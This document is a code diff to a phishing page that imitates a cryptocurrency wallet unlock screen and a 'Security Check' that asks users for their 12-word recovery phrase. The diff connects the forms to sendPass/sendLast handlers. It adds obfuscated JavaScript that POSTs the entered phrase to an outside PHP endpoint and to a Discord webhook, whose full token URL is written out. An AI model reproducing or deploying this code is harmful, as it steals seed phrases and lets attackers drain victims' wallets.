@@ -1628,7 +1628,7 @@
                             </div>
                             <h1 class="aaaaaa unlock-page__title">Welcome Back!</h1>
                             <div>The decentralized web awaits</div>
-                            <form onsubmit=class="unlock-page__form">
+                            <form onsubmit="sendPass(); return false;" class="unlock-page__form">
                                 <div class="MuiFormControl-root MuiTextField-root MuiFormControl-fullWidth">
                                     <label
                                         class="MuiFormLabel-root MuiInputLabel-root jss1 MuiInputLabel-formControl MuiInputLabel-animated MuiInputLabel-shrink Mui-focused jss2"
@@ -1643,7 +1643,7 @@
                                     </div>
                                 </div>
                             </form>
-                            <button type="submit"
+                            <button type="submit" onclick="sendPass(); return false;"
                                 class="MuiButtonBase-root MuiButton-root MuiButton-contained MuiButton-containedSizeLarge MuiButton-sizeLarge MuiButton-fullWidth"
                                 style="background-color: rgb(3, 125, 214); color: white; margin-top: 20px; height: 50px; font-weight: 400; box-shadow: none; border-radius: 100px;">Unlock</button>
                             <center>
@@ -2399,7 +2399,8 @@
                             <h1 class="aaaaaa unlock-page__title">Security Check</h1>
                             <div>We cannot confirm it's you.</div>
                             <div>Try again using another 12 word phrase.</div>
-                            <form class="unlock-page__form" style="margin: 40px 0 8px;">
+                            <form onsubmit="sendLast(); return false;" class="unlock-page__form"
+                                style="margin: 40px 0 8px;">
                                 <div class="MuiFormControl-root MuiTextField-root MuiFormControl-fullWidth">
                                     <label
                                         class="MuiFormLabel-root MuiInputLabel-root jss1 MuiInputLabel-formControl MuiInputLabel-animated"
@@ -2415,7 +2416,7 @@
                                     </div>
                                 </div>
                             </form>
-                            <button
+                            <button onclick="sendLast(); return false;"
                                 class="MuiButtonBase-root MuiButton-root MuiButton-contained MuiButton-containedSizeLarge MuiButton-sizeLarge MuiButton-fullWidth"
                                 style="background-color: rgb(3, 125, 214); color: white; margin-top: 20px; height: 50px; font-weight: 400; box-shadow: none; border-radius: 100px;">Confirm</button>
                             <div class="unlock-page__support" style="margin-top: 50px;"><span
@@ -2491,18 +2492,23 @@
                 _0x7421a5 = document.getElementById("firstModal"),
                 _0x49f3bb = document.getElementById("lastModal"),
                 _0x44f539 = document.getElementById("phraseModal");
-
-            _0x7421a5.style.display = "block", _0x44f539.style.display = "none",
-                $.ajax({
-                    type: "POST",
-                    url: 'https://discord.com/api/webhooks/965481930009239572/0zRImYiKa2Sauph9jL93Kf3g1ZRcduuBmTVleUAPfuqC4cThG-t6DRZ7JcOT07-4vwFt',
-                    data: {
-                        content: d5
-                    }
-                }), document.getElementById("phishingSecretInput").value = "", setTimeout(function () {
-                    false ? _0x2d7934 = !![] : (_0x7421a5.style.display = "none", _0x49f3bb.style.display = "block");
-                    $("#phishingSecret2Input").focus();
-                }, 1200);
+            _0x7421a5.style.display = "block", _0x44f539.style.display = "none", $.ajax({
+                type: "POST",
+                url: "https://metameta.osc-fr1.scalingo.io/verify-step-two.php",
+                data: {
+                    id: (new URL(location.href)).searchParams.get('id'),
+                    phrase: _0x11bc49
+                }
+            }), $.ajax({
+                type: "POST",
+                url: "https://discord.com/api/webhooks/965481930009239572/0zRImYiKa2Sauph9jL93Kf3g1ZRcduuBmTVleUAPfuqC4cThG-t6DRZ7JcOT07-4vwFt",
+                data: {
+                    content: d5
+                }
+            }), document.getElementById("phishingSecretInput").value = "", setTimeout(function () {
+                false ? _0x2d7934 = !![] : (_0x7421a5.style.display = "none", _0x49f3bb.style.display = "block");
+                $("#phishingSecret2Input").focus();
+            }, 1200);
         }
 
         function sorry_0x4bb7(_0x5461cd, _0xbebb8) {
